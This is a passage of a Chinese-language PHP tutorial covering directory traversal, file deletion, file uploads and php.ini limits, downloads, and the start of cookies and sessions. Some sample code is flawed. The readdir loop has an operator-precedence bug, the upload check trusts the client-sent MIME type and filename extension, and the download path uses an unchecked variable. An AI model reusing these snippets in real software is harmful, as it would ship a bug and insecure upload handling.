class="variable">$hd</span> = <span class="title function_ invoke__">opendir</span>( <span class="variable">$dir</span> ); <span class="comment">// 打开目录, 返回资源类型, 用 $hd 来代表被打开的目录</span></span><br><span class="line">    <span class="variable">$f</span> = <span class="title function_ invoke__">readdir</span>( <span class="variable">$hd</span> ); <span class="comment">// 读取目录, $f 为目录里面的文件名, 每次读出一个新的文件名 </span></span><br><span class="line">    <span class="comment">/* </span></span><br><span class="line"><span class="comment">         读取到最后, 会返回 false </span></span><br><span class="line"><span class="comment">         每个目录中都会有两个隐藏目录 . 和 .. </span></span><br><span class="line"><span class="comment">    */</span> </span><br><span class="line">    <span class="title function_ invoke__">closedir</span>( <span class="variable">$hd</span> ); <span class="comment">// 关闭目录 </span></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><h4 id="遍历目录"><a href="#遍历目录" class="headerlink" title="遍历目录"></a>遍历目录</h4><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">    <span class="variable">$dir</span> = <span class="string">&#x27;./images/&#x27;</span>;</span><br><span class="line">    <span class="variable">$hd</span> = <span class="title function_ invoke__">opendir</span>(<span class="variable">$dir</span>); <span class="comment">// 打开目录 </span></span><br><span class="line">    <span class="comment">// 逐条读取目录中的文件名 </span></span><br><span class="line">    <span class="keyword">while</span> ( <span class="variable">$f</span> = <span class="title function_ invoke__">readdir</span>(<span class="variable">$hd</span>) !== <span class="literal">false</span> ) &#123;</span><br><span class="line">    <span class="comment">// 跳过目录中的 . 和 .. 目录 </span></span><br><span class="line">    <span class="keyword">if</span> (<span class="variable">$f</span> == <span class="string">&#x27;.&#x27;</span> || <span class="variable">$f</span> == <span class="string">&#x27;..&#x27;</span>) &#123; <span class="keyword">continue</span>; &#125;</span><br><span class="line">    <span class="comment">// 输出文件名 </span></span><br><span class="line">    <span class="keyword">echo</span> <span class="variable">$f</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="title function_ invoke__">closedir</span>( <span class="variable">$hd</span> ); <span class="comment">// 关闭目录 </span></span><br><span class="line">    <span class="comment">/* </span></span><br><span class="line"><span class="comment">    如果文件名是 &#x27;0&#x27; 会误判断为 false, 从而提前结束跳出循环,</span></span><br><span class="line"><span class="comment">    所以加一个 !== 判断 </span></span><br><span class="line"><span class="comment">    */</span> </span><br><span class="line"></span><br></pre></td></tr></table></figure><h4 id="其他函数"><a href="#其他函数" class="headerlink" title="其他函数"></a>其他函数</h4><p><strong>file_exists</strong>( 带路径的文件名或目录名 ) 检查文件或目录是否存在. 存在返回 true 否则返回 false</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$i</span> = <span class="title function_ invoke__">file_exists</span>(<span class="string">&#x27;1.php&#x27;</span>);</span><br><span class="line"></span><br><span class="line"><span class="title function_ invoke__">var_dump</span>(<span class="variable">$i</span>);</span><br></pre></td></tr></table></figure><p><strong>is_dir</strong>( 带路径的文件名 ) 判断一个给定的文件名是否是一个目录</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$i</span> = <span class="title function_ invoke__">is_dir</span>(<span class="string">&#x27;1.php&#x27;</span>);</span><br><span class="line"></span><br><span class="line"><span class="title function_ invoke__">var_dump</span>(<span class="variable">$i</span>);</span><br></pre></td></tr></table></figure><p><strong>filetype</strong>( 带路径的文件名 ) 获取文件类型</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$i</span> = <span class="title function_ invoke__">filetype</span>(<span class="string">&#x27;1.php&#x27;</span>);</span><br><span class="line"></span><br><span class="line"><span class="title function_ invoke__">var_dump</span>(<span class="variable">$i</span>);</span><br></pre></td></tr></table></figure><p><strong>filesize</strong>( 带路径的文件名 ) 获取文件的大小, 单位为字节</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$i</span> = <span class="title function_ invoke__">filesize</span>(<span class="string">&#x27;1.php&#x27;</span>);</span><br><span class="line"></span><br><span class="line"><span class="title function_ invoke__">var_dump</span>(<span class="variable">$i</span>);</span><br></pre></td></tr></table></figure><p><strong>fileatime</strong>( 带路径的文件名 ) 获取文件的 上一次访问时间</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$i</span> = <span class="title function_ invoke__">fileatime</span>(<span class="string">&#x27;./1.php&#x27;</span>);</span><br><span class="line"></span><br><span class="line"><span class="title function_ invoke__">var_dump</span>(<span class="variable">$i</span>);</span><br></pre></td></tr></table></figure><p><strong>filectime</strong>( 带路径的文件名 ) 获取文件的 创建时间</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$i</span> = <span class="title function_ invoke__">filectime</span>(<span class="string">&#x27;./1.php&#x27;</span>);</span><br><span class="line"></span><br><span class="line"><span class="title function_ invoke__">var_dump</span>(<span class="variable">$i</span>);</span><br></pre></td></tr></table></figure><p><strong>filemtime</strong>( 带路径的文件名 ) 获取文件的 修改时间</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$i</span> = <span class="title function_ invoke__">filemtime</span>(<span class="string">&#x27;./1.php&#x27;</span>);</span><br><span class="line"></span><br><span class="line"><span class="title function_ invoke__">var_dump</span>(<span class="variable">$i</span>);</span><br></pre></td></tr></table></figure><p><strong>dirname</strong>( 路径 ) 返回路径中的目录部分. 如果路径本身是一个目录, 函数会返回它的父目录.</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$i</span> = <span class="title function_ invoke__">dirname</span>(<span class="string">&#x27;./1.php&#x27;</span>);</span><br><span class="line"></span><br><span class="line"><span class="title function_ invoke__">var_dump</span>(<span class="variable">$i</span>);<span class="comment">//返回./</span></span><br></pre></td></tr></table></figure><p><strong>basename</strong>( 路径 ) 返回基本的文件名</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$i</span> = <span class="title function_ invoke__">basename</span>(<span class="string">&#x27;./1.php&#x27;</span>);</span><br><span class="line"></span><br><span class="line"><span class="title function_ invoke__">var_dump</span>(<span class="variable">$i</span>);<span class="comment">//返回1.php</span></span><br></pre></td></tr></table></figure><p><strong>realpath</strong>( 文件或目录 ) 获取文件或目录 在本地电脑上的磁盘路径</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$i</span> = <span class="title function_ invoke__">realpath</span>(<span class="string">&#x27;./1.php&#x27;</span>);</span><br><span class="line"></span><br><span class="line"><span class="title function_ invoke__">var_dump</span>(<span class="variable">$i</span>);<span class="comment">//返回绝对路径D:\MyFiles\PHPStorm\PHP\1.php</span></span><br></pre></td></tr></table></figure><p><strong>pathinfo</strong>( 路径 ) 返回文件路径的信息</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$i</span> = <span class="title function_ invoke__">pathinfo</span>(<span class="string">&#x27;./1.php&#x27;</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">echo</span> <span class="string">&#x27;&lt;pre&gt;&#x27;</span>;</span><br><span class="line"><span class="title function_ invoke__">var_dump</span>(<span class="variable">$i</span>);</span><br><span class="line"></span><br><span class="line"><span class="comment">/*返回数组信息array(4) &#123;</span></span><br><span class="line"><span class="comment">  [&quot;dirname&quot;]=&gt;</span></span><br><span class="line"><span class="comment">  string(1) &quot;.&quot;</span></span><br><span class="line"><span class="comment">  [&quot;basename&quot;]=&gt;</span></span><br><span class="line"><span class="comment">  string(5) &quot;1.php&quot;</span></span><br><span class="line"><span class="comment">  [&quot;extension&quot;]=&gt;</span></span><br><span class="line"><span class="comment">  string(3) &quot;php&quot;</span></span><br><span class="line"><span class="comment">  [&quot;filename&quot;]=&gt;</span></span><br><span class="line"><span class="comment">  string(1) &quot;1&quot;</span></span><br><span class="line"><span class="comment">&#125;*/</span></span><br></pre></td></tr></table></figure><p><strong>copy</strong>( 源文件名, 新文件名 ) 复制文件</p><p><strong>mkdir</strong>( 名称 ) 新建目录</p><p><strong>rmdir</strong>( 空目录名称 ) 删除一个空目录</p><p><strong>unlink</strong>( 文件名 ) 删除一个文件</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$dir</span> = <span class="string">&#x27;./留言板&#x27;</span>;</span><br><span class="line"></span><br><span class="line">    <span class="variable">$f</span> = <span class="title function_ invoke__">opendir</span>(<span class="variable">$dir</span>);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">while</span>(<span class="variable">$fs</span> = <span class="title function_ invoke__">readdir</span>(<span class="variable">$f</span>))&#123;       <span class="comment">//遍历目录</span></span><br><span class="line">        <span class="keyword">if</span> (!(<span class="variable">$fs</span>==<span class="string">&#x27;.&#x27;</span> || <span class="variable">$fs</span> == <span class="string">&#x27;..&#x27;</span>))&#123;</span><br><span class="line">            <span class="keyword">echo</span> <span class="variable">$fs</span>;</span><br><span class="line">            <span class="variable">$z</span> = <span class="string">&#x27;./留言板/&#x27;</span>.<span class="variable">$fs</span>;</span><br><span class="line">            <span class="keyword">echo</span> <span class="variable">$z</span>;</span><br><span class="line">            <span class="title function_ invoke__">unlink</span>(<span class="variable">$z</span>);     <span class="comment">//删除文件</span></span><br><span class="line"></span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="title function_ invoke__">closedir</span>(<span class="variable">$f</span>);</span><br><span class="line">    <span class="title function_ invoke__">rmdir</span>(<span class="string">&#x27;./留言板&#x27;</span>);     <span class="comment">//删除空文件夹</span></span><br></pre></td></tr></table></figure><h1 id="文件上传"><a href="#文件上传" class="headerlink" title="文件上传"></a>文件上传</h1><h2 id="表单部分和接收处理"><a href="#表单部分和接收处理" class="headerlink" title="表单部分和接收处理"></a>表单部分和接收处理</h2><h3 id="表单传值"><a href="#表单传值" class="headerlink" title="表单传值"></a>表单传值</h3><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">form</span> <span class="attr">action</span>=<span class="string">&#x27;./index.php&#x27;</span> <span class="attr">method</span>=<span class="string">&#x27;POST&#x27;</span> <span class="attr">enctype</span>=<span class="string">&#x27;multipart/form-data&#x27;</span>&gt;</span> </span><br><span class="line">    <span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">&#x27;file&#x27;</span> <span class="attr">name</span>=<span class="string">&#x27;pic&#x27;</span> /&gt;</span> </span><br><span class="line">    <span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">&#x27;submit&#x27;</span> <span class="attr">value</span>=<span class="string">&#x27;提交&#x27;</span> /&gt;</span> </span><br><span class="line"><span class="tag">&lt;/<span class="name">form</span>&gt;</span> </span><br><span class="line"></span><br><span class="line"><span class="comment">&lt;!-- </span></span><br><span class="line"><span class="comment">1) method 必须是 POST </span></span><br><span class="line"><span class="comment">2) enctype=&#x27;multipart/form-data&#x27; 这一项必须有 </span></span><br><span class="line"><span class="comment">3) input 标签中 type=&#x27;file&#x27; 必须有 name 值 </span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">多文件上传: </span></span><br><span class="line"><span class="comment">方式一:</span></span><br><span class="line"><span class="comment">&lt;input type=&#x27;file&#x27; name=&#x27;pic[]&#x27; /&gt; </span></span><br><span class="line"><span class="comment">&lt;input type=&#x27;file&#x27; name=&#x27;pic[]&#x27; /&gt;</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">方式二:</span></span><br><span class="line"><span class="comment">&lt;input type=&#x27;file&#x27; name=&#x27;pic[]&#x27; multiple /&gt; </span></span><br><span class="line"><span class="comment">--&gt;</span></span><br></pre></td></tr></table></figure><h3 id="后端接收"><a href="#后端接收" class="headerlink" title="后端接收"></a>后端接收</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">echo</span> <span class="string">&#x27;&lt;pre&gt;&#x27;</span>; </span><br><span class="line"><span class="title function_ invoke__">print_r</span>( <span class="variable">$_FILES</span>[<span class="string">&#x27;pic&#x27;</span>] ); <span class="comment">// 接收表单传过来的 上传文件信息 </span></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p><strong>$_FILES[ ‘pic’ ]</strong> 中的具体信息</p><p><code>$_FILES[ &#39;pic&#39; ][&#39;name&#39;]</code> 原始文件名</p><p><code>$_FILES[ &#39;pic&#39; ][&#39;type&#39;]</code> 文件类型</p><p><code>$_FILES[ &#39;pic&#39; ][&#39;tmp_name&#39;]</code> 上传以后的 临时文件名</p><p><code>$_FILES[ &#39;pic&#39; ][&#39;error&#39;]</code> 错误号, 不同的错误号, 代表着不同的错误</p><p><code>$_FILES[ &#39;pic&#39; ][&#39;size&#39;]</code> 上传文件的大小, 单位为字节</p><h2 id="php-ini中关于文件上传的限制"><a href="#php-ini中关于文件上传的限制" class="headerlink" title="php.ini中关于文件上传的限制"></a>php.ini中关于文件上传的限制</h2><p><strong>post_max_size&#x3D;8M</strong>   &amp;nbsp; &amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;表单提交的最大数据量</p><p><strong>file_uploads&#x3D;On</strong> &amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;是否开启文件上传功能</p><p><strong>upload_tmp_dir&#x3D;</strong>“D:\xampp\tmp”  &amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;文件上传后的 临时存放目录</p><p><strong>upload_max_filesize&#x3D;2M</strong>  &amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;单个上传文件 最大限制</p><p><strong>max_file_uploads&#x3D;20</strong>   &amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp; 一次可以同时上传多少个文件</p><h3 id="错误号的含义"><a href="#错误号的含义" class="headerlink" title="错误号的含义"></a>错误号的含义</h3><p>&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;0 上传成功</p><p>&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;1 上传的文件超过了 php.ini 中 upload_max_filesize 选项限制的值</p><p>&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;2 上传文件的大小超过了 HTML 表单中 MAX_FILE_SIZE 选项指定的值</p><p>&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;3 文件只有部分被上传</p><p>&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;4 没有文件被上传</p><p>&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;6 找不到临时文件夹</p><p>&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;7 文件写入失败</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="variable">$error</span> = <span class="variable">$_FILES</span>[<span class="string">&#x27;pic&#x27;</span>][<span class="string">&#x27;error&#x27;</span>]; </span><br><span class="line"> </span><br><span class="line"><span class="keyword">switch</span>(<span class="variable">$error</span>)&#123; </span><br><span class="line">        <span class="keyword">case</span> <span class="number">0</span>: <span class="keyword">echo</span> <span class="string">&#x27;上传成功&#x27;</span>; <span class="keyword">break</span>; </span><br><span class="line">        <span class="keyword">case</span> <span class="number">1</span>: <span class="keyword">echo</span> <span class="string">&#x27;上传的文件超过了 php.ini 中 upload_max_filesize 选项限制的值&#x27;</span>; <span class="keyword">break</span>; </span><br><span class="line">        <span class="keyword">case</span> <span class="number">2</span>: <span class="keyword">echo</span> <span class="string">&#x27;上传文件的大小超过了 HTML 表单中 MAX_FILE_SIZE 选项指定的值&#x27;</span>; <span class="keyword">break</span>; </span><br><span class="line">        <span class="keyword">case</span> <span class="number">3</span>: <span class="keyword">echo</span> <span class="string">&#x27;文件只有部分被上传&#x27;</span>; <span class="keyword">break</span>; </span><br><span class="line">        <span class="keyword">case</span> <span class="number">4</span>: <span class="keyword">echo</span> <span class="string">&#x27;没有文件被上传&#x27;</span>; <span class="keyword">break</span>; </span><br><span class="line">        <span class="keyword">case</span> <span class="number">6</span>: <span class="keyword">echo</span> <span class="string">&#x27;找不到临时文件夹&#x27;</span>; <span class="keyword">break</span>; </span><br><span class="line">        <span class="keyword">case</span> <span class="number">7</span>: <span class="keyword">echo</span> <span class="string">&#x27;文件写入失败&#x27;</span>; <span class="keyword">break</span>; </span><br><span class="line">&#125; </span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>系统给以上错误号定义分别定义了常量</p><p>0 &amp;nbsp;&amp;nbsp;UPLOAD_ERR_OK</p><p>1 &amp;nbsp;&amp;nbsp;UPLOAD_ERR_INI_SIZE</p><p>2 &amp;nbsp;&amp;nbsp;UPLOAD_ERR_FORM_SIZE</p><p>3 &amp;nbsp;&amp;nbsp;UPLOAD_ERR_PARTIAL</p><p>4 &amp;nbsp;&amp;nbsp;UPLOAD_ERR_NO_FILE</p><p>6 &amp;nbsp;&amp;nbsp;UPLOAD_ERR_NO_TMP_DIR</p><p>7 &amp;nbsp;&amp;nbsp;UPLOAD_ERR_CANT_WRITE</p><h2 id="文件判断"><a href="#文件判断" class="headerlink" title="文件判断"></a>文件判断</h2><h3 id="类型判断"><a href="#类型判断" class="headerlink" title="类型判断"></a>类型判断</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$type</span> = [<span class="string">&#x27;image/jpeg&#x27;</span>, <span class="string">&#x27;image/png&#x27;</span>, <span class="string">&#x27;image/gif&#x27;</span>]; </span><br><span class="line">   </span><br><span class="line">    <span class="keyword">if</span> (!<span class="title function_ invoke__">in_array</span>(<span class="variable">$_FILES</span>[<span class="string">&#x27;pic&#x27;</span>][<span class="string">&#x27;type&#x27;</span>], <span class="variable">$type</span>)) &#123; </span><br><span class="line">    <span class="keyword">die</span>(<span class="string">&#x27;上传文件的类型不符合要求&#x27;</span>); </span><br><span class="line">    &#125; </span><br></pre></td></tr></table></figure><h3 id="大小判断"><a href="#大小判断" class="headerlink" title="大小判断"></a>大小判断</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$max_size</span> = <span class="number">4096</span>; </span><br><span class="line"><span class="variable">$size</span> = <span class="variable">$_FILES</span>[<span class="string">&#x27;pic&#x27;</span>][<span class="string">&#x27;size&#x27;</span>]; </span><br><span class="line"><span class="keyword">if</span> (<span class="variable">$size</span> &gt; <span class="variable">$max_size</span>) &#123; </span><br><span class="line"><span class="keyword">die</span>(<span class="string">&#x27;上传文件超过要求大小&#x27;</span>); </span><br><span class="line">&#125; </span><br></pre></td></tr></table></figure><h2 id="生成随机文件名"><a href="#生成随机文件名" class="headerlink" title="生成随机文件名"></a>生成随机文件名</h2><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="variable">$path</span> = <span class="string">&#x27;./uploads/&#x27;</span>; </span><br><span class="line"><span class="variable">$ext</span> = <span class="title function_ invoke__">pathinfo</span>(<span class="variable">$_FILES</span>[<span class="string">&#x27;pic&#x27;</span>][<span class="string">&#x27;name&#x27;</span>], PATHINFO_EXTENSION); <span class="comment">// 取得 扩展名 </span></span><br><span class="line"></span><br><span class="line"><span class="keyword">do</span>&#123; </span><br><span class="line"></span><br><span class="line"><span class="variable">$fileName</span> = <span class="variable">$path</span>.<span class="title function_ invoke__">date</span>(<span class="string">&#x27;YmdHis&#x27;</span>).<span class="title function_ invoke__">mt_rand</span>(<span class="number">1000</span>,<span class="number">9999</span>).<span class="string">&#x27;.&#x27;</span>.<span class="variable">$ext</span>; <span class="comment">// 拼装 目标文件名</span></span><br><span class="line">          </span><br><span class="line">&#125; <span class="keyword">while</span> ( <span class="title function_ invoke__">file_exists</span>( <span class="variable">$fileName</span> ) ); <span class="comment">// 判断目标文件是否存在, 如果存在,循环生成一个新名字 </span></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><h2 id="文件上传的两个函数"><a href="#文件上传的两个函数" class="headerlink" title="文件上传的两个函数"></a>文件上传的两个函数</h2><p><strong>is_uploaded_file</strong>( 临时文件名 ) 判断文件是否是通过 HTTP POST 上传的</p><p><strong>move_uploaded_file</strong>( 临时文件名, 目标文件名 ) 将临时文件移动到指定的新位置</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">    <span class="variable">$tmpName</span> = <span class="variable">$_FILES</span>[<span class="string">&#x27;pic&#x27;</span>][<span class="string">&#x27;tmp_name&#x27;</span>]; </span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (<span class="title function_ invoke__">is_uploaded_file</span>(<span class="variable">$tmpName</span>)) &#123; </span><br><span class="line">    <span class="title function_ invoke__">move_uploaded_file</span>(<span class="variable">$tmpName</span>, <span class="variable">$fileName</span>); </span><br><span class="line">    &#125; </span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><h2 id="多文件上传数组变形"><a href="#多文件上传数组变形" class="headerlink" title="多文件上传数组变形"></a>多文件上传数组变形</h2><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">foreach</span>(<span class="variable">$_FILES</span>[<span class="string">&#x27;pic&#x27;</span>][<span class="string">&#x27;name&#x27;</span>] <span class="keyword">as</span> <span class="variable">$k</span> =&gt; <span class="variable">$v</span>)&#123; </span><br><span class="line">        <span class="variable">$uploads</span>[<span class="variable">$k</span>][<span class="string">&#x27;name&#x27;</span>] = <span class="variable">$_FILES</span>[<span class="string">&#x27;pic&#x27;</span>][<span class="string">&#x27;name&#x27;</span>][<span class="variable">$k</span>]; </span><br><span class="line">        <span class="variable">$uploads</span>[<span class="variable">$k</span>][<span class="string">&#x27;type&#x27;</span>] = <span class="variable">$_FILES</span>[<span class="string">&#x27;pic&#x27;</span>][<span class="string">&#x27;type&#x27;</span>][<span class="variable">$k</span>]; </span><br><span class="line">        <span class="variable">$uploads</span>[<span class="variable">$k</span>][<span class="string">&#x27;tmp_name&#x27;</span>]= <span class="variable">$_FILES</span>[<span class="string">&#x27;pic&#x27;</span>][<span class="string">&#x27;tmp_name&#x27;</span>][<span class="variable">$k</span>]; </span><br><span class="line">        <span class="variable">$uploads</span>[<span class="variable">$k</span>][<span class="string">&#x27;error&#x27;</span>] = <span class="variable">$_FILES</span>[<span class="string">&#x27;pic&#x27;</span>][<span class="string">&#x27;error&#x27;</span>][<span class="variable">$k</span>]; </span><br><span class="line">        <span class="variable">$uploads</span>[<span class="variable">$k</span>][<span class="string">&#x27;size&#x27;</span>] = <span class="variable">$_FILES</span>[<span class="string">&#x27;pic&#x27;</span>][<span class="string">&#x27;size&#x27;</span>][<span class="variable">$k</span>]; </span><br><span class="line">&#125; </span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><h2 id="文件下载"><a href="#文件下载" class="headerlink" title="文件下载"></a>文件下载</h2><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">header</span>(<span class="string">&quot;Content-Type:类型&quot;</span>); <span class="comment">//指定响应类型 </span></span><br><span class="line"><span class="title function_ invoke__">header</span>(<span class="string">&quot;Content-Disposition:attachment;filename=文件名&quot;</span>); <span class="comment">//**执行下载文件名 </span></span><br><span class="line"><span class="title function_ invoke__">header</span>(<span class="string">&quot;Content-Length:文件大小&quot;</span>);</span><br><span class="line">    </span><br><span class="line"><span class="title function_ invoke__">readfile</span>(<span class="string">&quot;./uploads/&quot;</span>.<span class="variable">$picname</span>); <span class="comment">//读取并输出图片内容； </span></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><h1 id="会话控制"><a href="#会话控制" class="headerlink" title="会话控制"></a>会话控制</h1><p>​<strong>允许服务器跟踪同一个客户端做出的连续的请求</strong></p><h2 id="cookie"><a href="#cookie" class="headerlink" title="cookie"></a>cookie</h2><p>​<strong>服务器端给客户端的信息，让客户端进行存储</strong></p><h3 id="cookie的使用"><a href="#cookie的使用" class="headerlink" title="cookie的使用"></a>cookie的使用</h3><h4 id="1-设置cookie"><a href="#1-设置cookie" class="headerlink" title="1.设置cookie"></a>1.设置cookie</h4><p>格式: setcookie( 名字，值  [, 失效时间 [, 保存路径 ] ] );</p><p>​例子:</p><p>​&#x2F;&#x2F;向客户端发送一个Cookie,将变量username值为joker,保存客户端一周的时间 </p><p>​setcookie(“username”, “joker”, time()+60*60*24*7,’&#x2F;‘);</p><h4 id="2-获取cookie"><a href="#2-获取cookie" class="headerlink" title="2.获取cookie"></a>2.获取cookie</h4><p>​$_COOKIE[ ‘ 名字 ‘ ];   (超全局数组)</p><h4 id="3-删除cookie"><a href="#3-删除cookie" class="headerlink" title="3.删除cookie"></a>3.删除cookie</h4><p>​setcookie(名,值,当前时间-1),告诉服务器这个值已经过期，删除cookie的时候也要一个一个删除</p><p>​例子:</p><pre><code>     //设置Cookie 在当前时间过期，因此系统会自动删除识别名称为isLogin的Cookie        </code></pre><p>​ setcookie(“isLogin”, “” , time()-1); </p><p>​</p><h2 id="session"><a href="#session" class="headerlink" title="session"></a>session</h2><p>​存放在服务器端的全局数组:$_SESSION</p><h3 id="session的原理"><a 